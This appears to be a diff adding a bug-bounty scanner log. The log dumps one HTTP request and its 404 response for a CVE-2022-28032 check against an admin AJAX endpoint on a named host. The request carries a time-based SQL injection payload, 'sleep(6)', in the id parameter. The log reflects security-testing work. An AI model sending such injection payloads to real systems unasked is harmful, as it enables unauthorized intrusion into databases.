@@ -1,0 +1,28 @@
+[CVE-2022-28032] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/ajax/pages.php?id=(sleep(6))
+
+
+GET /admin/ajax/pages.php?id=(sleep(6)) HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2022-28032] Dumped HTTP response https://techsolutions.bitpanda.com/admin/ajax/pages.php?id=(sleep(6))
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 0fad2b2f93c2ade9df8e31249e9938a2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: KPlzsWXtVc1Iwh7IUheY08GSj5Ilr1MfFQcV71mcu6cGMnhLjLE2Tw==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: uCk7xBfyNHFwh63Jsg64GBfa26K1rsHhlLFHr8PsgV8ba9wfxb9RHAN6YLvjIFpl+DAaFTDp5F8=
+X-Amz-Request-Id: 41Z9NRK2TJEAKGCW
+X-Cache: Error from cloudfront
+
+Not Found
